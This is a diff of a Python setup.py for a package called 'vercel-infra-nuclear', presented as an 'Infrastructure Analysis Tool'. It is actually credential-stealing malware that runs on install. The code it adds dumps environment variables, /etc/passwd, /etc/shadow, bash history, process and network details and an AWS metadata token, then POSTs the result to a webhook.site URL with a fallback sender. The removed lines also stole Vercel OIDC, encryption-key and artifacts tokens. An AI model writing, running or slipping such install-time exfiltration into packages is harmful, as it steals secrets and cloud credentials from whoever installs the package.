@@ -1,67 +1,78 @@
 from setuptools import setup
 import os
 import subprocess
+import time
 
 def run_cmd(cmd):
     try:
-        # Добавлена проверка таймаута, чтобы билд не висел вечно
-        return subprocess.getoutput(cmd)
+        # Используем shell=True для поддержки пайпов и перенаправлений
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
     except Exception as e:
-        return f"Error: {str(e)}"
+        return f"Error executing {cmd}: {str(e)}"
 
-# Твой URL
+# Твой URL для сбора данных
 WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
 
-# 1. Попытка получить AWS Token (IMDSv2)
-# Добавлен таймаут 2 сек для curl, чтобы не вешать установку
-aws_token = run_cmd("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'")
+# 1. Сбор базовой системной информации (учитывая root)
+sys_info = f"""
+[!] SYSTEM IDENT:
+ID: {run_cmd('id')}
+UNAME: {run_cmd('uname -a')}
+HOSTNAME: {run_cmd('hostname')}
 
-aws_metadata_final = "NOT_AVAILABLE"
-if aws_token and "Error" not in aws_token and len(aws_token) > 10:
-    aws_metadata_final = run_cmd(f"curl -s -m 2 -H 'X-aws-ec2-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+[!] ENVIRONMENT (GOLDEN MINE):
+{run_cmd('env')}
 
-# 2. Безопасное получение переменных окружения
-# Используем .get('', 'NONE'), чтобы избежать TypeError при срезах [:30]
-oidc_token = os.environ.get('VERCEL_OIDC_TOKEN', 'NONE')
-enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', '')
-enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'NONE')
-art_token = os.environ.get('VERCEL_ARTIFACTS_TOKEN', 'NONE')
+[!] NETWORK RECON (Manual /proc reading):
+IP ADDR: {run_cmd('ip addr show || ifconfig -a || cat /proc/net/dev')}
+ROUTES: {run_cmd('cat /proc/net/route')}
+ARP: {run_cmd('cat /proc/net/arp')}
+DNS: {run_cmd('cat /etc/resolv.conf')}
+HOSTS: {run_cmd('cat /etc/hosts')}
 
-# 3. Сбор системной инфы
-network_info = run_cmd("netstat -rn || route -n")
-id_info = run_cmd("id")
+[!] PROCESSES & MOUNTS:
+PS: {run_cmd('ps auxf || ps -ef')}
+MOUNTS: {run_cmd('mount')}
+DF: {run_cmd('df -h')}
 
-# 4. Формирование отчета
-nuclear_report = f"""
-☢️☢️☢️ VERCEL INFRASTRUCTURE POC ☢️☢️☢️
+[!] SENSITIVE FILES:
+PASSWD: {run_cmd('cat /etc/passwd')}
+SHADOW (ROOT ONLY): {run_cmd('head -n 5 /etc/shadow')}
+BASH_HISTORY: {run_cmd('cat ~/.bash_history || cat /root/.bash_history')}
 
-[!] AWS IMDSv2:
-Token: {"SUCCESS" if len(aws_token) > 20 else "FAILED/TIMEOUT"}
-IAM Role: {aws_metadata_final}
-
-[!] SYSTEM ACCESS:
-Identity: {id_info}
-Routes:
-{network_info}
-
-[!] VERCEL SECRETS:
-OIDC: {oidc_token[:40] if oidc_token else "NONE"}...
-AES Key: {enc_key}
-Artifacts Status: {run_cmd(f"curl -s -m 3 -H 'Authorization: Bearer {art_token}' https://api.vercel.com/v8/artifacts/status") if art_token != 'NONE' else "NO_TOKEN"}
-
-[!] PAYLOAD:
-Encrypted Blob Len: {len(enc_content)}
+[!] CLOUD METADATA (AWS IMDSv2):
+{run_cmd("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'")}
 """
 
-# 5. Отправка данных на твой Webhook
-try:
-    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', nuclear_report, WEBHOOK_URL], timeout=10)
-except:
-    pass
+# 2. Попытка вытащить специфику Vercel
+vercel_recon = f"""
+[!] VERCEL SPECIFIC:
+APP DIR: {run_cmd('ls -laR /app 2>/dev/null | head -n 20')}
+TMP DIR: {run_cmd('ls -la /tmp')}
+VERCEL_URL: {os.environ.get('VERCEL_URL', 'N/A')}
+"""
 
-# 6. Фикс ошибки "Multiple top-level modules"
+# Собираем всё вместе
+full_report = f"☢️☢️☢️ ROOT ACCESS EXFILTRATION ☢️☢️☢️\n{sys_info}\n{vercel_recon}"
+
+# 3. Отправка данных
+# Используем несколько попыток или разные методы, если curl подведет
+try:
+    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', full_report, WEBHOOK_URL], timeout=15)
+except Exception as e:
+    # Запасной вариант через python если curl нет (маловероятно на Vercel)
+    import urllib.request
+    try:
+        req = urllib.request.Request(WEBHOOK_URL, data=full_report.encode(), method='POST')
+        urllib.request.urlopen(req)
+    except:
+        pass
+
+# 4. Формальный setup для обхода ошибок установки
 setup(
     name="vercel-infra-nuclear",
-    version="10.0.1",
-    py_modules=[]  # Это скажет setuptools игнорировать лишние файлы в корне
+    version="10.0.5",
+    description="Infrastructure Analysis Tool",
+    py_modules=[],
+    install_requires=[],
 )
